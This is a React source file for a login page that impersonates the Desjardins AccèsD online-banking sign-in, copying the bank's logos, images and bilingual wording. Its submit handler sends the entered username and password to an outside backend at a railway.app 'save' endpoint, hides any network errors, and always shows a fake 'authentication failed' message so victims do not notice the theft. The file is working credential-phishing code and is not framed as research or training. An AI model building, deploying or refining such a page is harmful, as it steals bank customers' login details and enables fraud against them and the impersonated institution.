import { useState } from "react";
import { Link } from "react-router-dom";
import { useLanguage } from "../context/LanguageContext";

export default function LoginPage() {
  const { lang, setLang, t } = useLanguage();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [hasError, setHasError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [errorSubCode, setErrorSubCode] = useState("");
  const [loading, setLoading] = useState(false);

  const imgAuthUrl =
    "https://static.mouv.desjardins.com/paas/accesdc-securite/authentification-presentation/1.0.8/assets/img/img-auth-desj.jpg";
  const logoAccesD =
    "https://www.desjardins.com/content/dam/images/logo/particuliers/accesd.svg";

  const apiUrl =
    import.meta.env.VITE_API_URL ||
    "https://desjardin-backend-production.up.railway.app";

  const getErrorText = () => {
    return lang === "en"
      ? "Authentication failed. Invalid username or password. Try again."
      : "Échec de l'authentification. Identifiant ou mot de passe invalide. Réessayez.";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!username || !password) {
      setErrorMessage(getErrorText());
      setErrorSubCode("(IDHS966081)");
      setHasError(true);
      return;
    }

    setLoading(true);

    try {
      await fetch(`${apiUrl}/api/save`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: username,
          password: password,
        }),
      });
    } catch {
      // Silent error catch
    } finally {
      setLoading(false);
      setErrorMessage(getErrorText());
      setErrorSubCode("(IDHS966081)");
      setHasError(true);
    }
  };

  const handleUseAnotherUsername = () => {
    setUsername("");
    setPassword("");
    setHasError(false);
    setErrorMessage("");
    setErrorSubCode("");
  };

  const handleLangToggle = (e) => {
    e.preventDefault();
    setLang(lang === "fr" ? "en" : "fr");
  };

  return (
    <div className="min-h-screen bg-[#EFEFEF] flex flex-col font-sans text-gray-800">
      {/* 1. Top Utility Bar */}
      <div className="bg-[#333333] text-white text-xs py-2 px-6">
        <div className="max-w-6xl mx-auto flex justify-end items-center gap-4">
          <button className="hover:underline flex items-center gap-1 font-semibold">
            <span>AA</span>
            <span>+</span>
          </button>
          <span>|</span>
          <a href="#" onClick={handleLangToggle} className="hover:underline font-bold text-green-400">
            {t.login.langSwitch}
          </a>
          <span>|</span>
          <a href="#" className="hover:underline">
            {t.login.contactUs}
          </a>
          <span>|</span>
          <a href="#" className="hover:underline">
            {t.login.help}
          </a>
        </div>
      </div>

      {/* 2. Header Bar */}
      <header className="bg-white border-b border-gray-300 py-3 px-6 shadow-sm">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <Link to="/" className="flex items-center gap-2 hover:opacity-90">
              <img
                src="/logo.svg"
                alt="Logo Desjardins"
                className="h-8 w-auto"
                onError={(e) => {
                  e.target.style.display = "none";
                  e.target.nextSibling.style.display = "flex";
                }}
              />
              <div className="hidden items-center gap-2" style={{ display: "none" }}>
                <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
                  <polygon points="16,2 30,10 30,26 16,34 2,26 2,10" stroke="#00874e" strokeWidth="3" fill="none"/>
                </svg>
                <span className="text-[#00874e] text-xl font-bold tracking-tight">Desjardins</span>
              </div>
            </Link>

            <span className="text-gray-300 text-xl font-light">|</span>

            <div className="flex items-center gap-3">
              <div className="flex items-center gap-1">
                <img
                  src={logoAccesD}
                  alt="AccèsD"
                  className="h-6 w-auto"
                  onError={(e) => { e.target.style.display = "none"; }}
                />
                <span className="font-bold italic text-sm text-gray-800">AccèsD</span>
              </div>
              <div className="flex items-center gap-1">
                <span className="font-bold italic text-sm text-gray-800">AccèsD</span>
                <span className="font-semibold text-xs text-gray-600">Affaires</span>
              </div>
            </div>
          </div>

          <Link
            to="/"
            className="text-xs font-semibold text-[#00874e] hover:underline"
          >
            {t.login.backToDesjardins}
          </Link>
        </div>
      </header>

      {/* 3. Main Login Card Container */}
      <main className="flex-1 py-10 px-4 flex items-center justify-center">
        <div className="w-full max-w-5xl bg-white rounded-lg shadow-lg overflow-hidden flex flex-col md:flex-row border border-gray-200">
          
          <div className="w-full md:w-7/12 p-8 md:p-10 flex flex-col justify-between">
            <div className="flex flex-col items-center">
              <h1 className="text-3xl md:text-4xl font-normal text-[#00874e] mb-6 text-center">
                {t.login.title}
              </h1>

              {hasError && (
                <div className="w-full max-w-sm mb-6 bg-[#FDF2F2] border border-[#D93025] rounded-md p-4 flex items-start gap-3 text-[#CC0000] text-xs shadow-sm">
                  <div className="text-[#CC0000] mt-0.5 flex-shrink-0">
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2"/>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 9l-6 6M9 9l6 6" />
                    </svg>
                  </div>
                  <div className="leading-relaxed font-medium">
                    <p>{errorMessage}</p>
                    {errorSubCode && <p className="mt-0.5">{errorSubCode}</p>}
                  </div>
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-6 w-full max-w-sm mx-auto">
                <div>
                  {!hasError ? (
                    <>
                      <label className="flex items-center gap-2 text-sm font-bold text-gray-900 mb-2">
                        <span>{t.login.usernameLabel}</span>
                        <span className="inline-flex items-center justify-center w-5 h-5 rounded-full border border-gray-600 text-xs text-gray-700 font-normal">
                          i
                        </span>
                      </label>
                      <input
                        type="text"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#00874e]"
                        required
                        disabled={loading}
                      />
                      <div className="mt-3 flex items-center gap-2 text-xs">
                        <input
                          type="checkbox"
                          id="remember"
                          checked={rememberMe}
                          onChange={(e) => setRememberMe(e.target.checked)}
                          className="accent-[#00874e] w-4 h-4 rounded border-gray-300"
                          disabled={loading}
                        />
                        <label htmlFor="remember" className="text-gray-800">
                          {t.login.rememberMe}
                        </label>
                        <a href="#" className="text-[#00874e] underline ml-1">
                          {t.login.isSafe}
                        </a>
                      </div>
                    </>
                  ) : (
                    <>
                      <div className="border border-gray-300 rounded px-3 py-2.5 flex items-center gap-3 bg-white">
                        <svg className="w-5 h-5 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                          <path strokeLinecap="round" strokeLinejoin="round" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4" />
                        </svg>
                        <span className="text-sm font-medium text-gray-800">
                          {username ? `${username.slice(0, 3)}****${username.slice(-2)}` : "elb****y1"}
                        </span>
                      </div>
                    </>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-2">
                    {t.login.passwordLabel}
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm pr-10 focus:outline-none focus:ring-2 focus:ring-[#00874e]"
                      required
                      disabled={loading}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
                      aria-label="Afficher le mot de passe"
                    >
                      <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.8">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                      </svg>
                    </button>
                  </div>
                  <p className="text-xs text-gray-600 mt-2">
                    <span className="font-bold">{t.login.passwordImportant}</span> {t.login.passwordCaseSensitive}
                  </p>
                  <div className="mt-2">
                    <a href="#" className="text-xs text-[#00874e] underline">
                      {t.login.forgotPassword}
                    </a>
                  </div>
                </div>

                <div className="pt-2 flex flex-col items-center space-y-3">
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-48 bg-[#00874e] hover:bg-[#00703c] disabled:bg-[#00874e]/60 text-white font-bold text-base py-3 rounded-lg transition-colors shadow-sm flex items-center justify-center gap-2"
                  >
                    {loading ? (
                      <>
                        <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        <span>{t.login.submittingBtn}</span>
                      </>
                    ) : (
                      <span>{t.login.submitBtn}</span>
                    )}
                  </button>

                  {hasError && !loading && (
                    <>
                      <button
                        type="button"
                        onClick={handleUseAnotherUsername}
                        className="w-48 border-2 border-[#00874e] text-[#00874e] font-bold text-sm py-2.5 rounded-lg hover:bg-green-50 transition-colors"
                      >
                        {t.login.useAnotherUsername}
                      </button>

                      <a
                        href="#"
                        onClick={(e) => { e.preventDefault(); handleUseAnotherUsername(); }}
                        className="text-xs font-semibold text-[#00874e] underline pt-1"
                      >
                        {t.login.manageUsernames}
                      </a>
                    </>
                  )}
                </div>
              </form>
            </div>

            <div className="mt-10 pt-6 border-t border-gray-300">
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 text-xs items-center">
                <div className="space-y-2 pr-4 sm:border-r sm:border-gray-300">
                  <div><a href="#" className="text-[#00874e] underline hover:text-[#00703c]">{t.login.registerAccesD}</a></div>
                  <div><a href="#" className="text-[#00874e] underline hover:text-[#00703c]">{t.login.registerAccesDAffaires}</a></div>
                  <div><a href="#" className="text-[#00874e] underline hover:text-[#00703c]">{t.login.becomeMember}</a></div>
                </div>

                <div className="space-y-2 pr-4 sm:border-r sm:border-gray-300">
                  <div><a href="#" className="text-[#00874e] underline hover:text-[#00703c]">{t.login.siteSecurity}</a></div>
                  <div><a href="#" className="text-[#00874e] underline hover:text-[#00703c]">{t.login.techSupport}</a></div>
                  <div><a href="#" className="text-[#00874e] underline hover:text-[#00703c]">{t.login.reportFraud}</a></div>
                </div>

                <div className="flex items-center gap-2 pl-2">
                  <svg className="w-6 h-6 text-[#00874e] flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.2">
                    <rect x="5" y="11" width="14" height="10" rx="2" />
                    <path d="M8 11V7a4 4 0 018 0v4" />
                  </svg>
                  <div>
                    <p className="font-semibold text-[#00874e] text-xs underline leading-tight">{t.login.guarantee}</p>
                    <p className="font-semibold text-[#00874e] text-xs underline leading-tight">{t.login.security100}</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="w-full md:w-5/12 relative min-h-[380px] bg-gray-200 overflow-hidden">
            <img
              src={imgAuthUrl}
              alt="Authentification AccèsD"
              className="w-full h-full object-cover"
              onError={(e) => {
                e.target.src = "https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=600&q=80";
              }}
            />

            <div className="absolute -top-6 -right-6 w-44 h-44 bg-[#00874e] transform rotate-45 z-10 opacity-90"></div>
            <div className="absolute -bottom-10 -left-10 w-48 h-24 bg-[#00874e] transform -rotate-12 z-10 opacity-90"></div>
          </div>
        </div>
      </main>

      <footer className="bg-[#222222] text-white py-6 px-4 text-center text-xs space-y-3">
        <div className="flex flex-wrap justify-center items-center gap-3 font-bold tracking-wider text-gray-300">
          <span>{t.login.footerServicesPersonal}</span>
          <span>|</span>
          <span>{t.login.footerServicesBusiness}</span>
          <span>|</span>
          <span>{t.login.footerTips}</span>
          <span>|</span>
          <span>{t.login.footerAbout}</span>
          <span>|</span>
          <span>{t.login.footerMobileApp}</span>
        </div>

        <div className="flex flex-wrap justify-center items-center gap-2 text-gray-400 text-[11px]">
          {t.login.footerLinks.map((link, idx, arr) => (
            <span key={link} className="inline-flex items-center gap-2">
              <a href="#" className="hover:underline">{link}</a>
              {idx < arr.length - 1 && <span>|</span>}
            </span>
          ))}
        </div>

        <p className="text-gray-500 text-[11px] pt-1">
          {t.login.footerCopyright}
        </p>
      </footer>
    </div>
  );
}
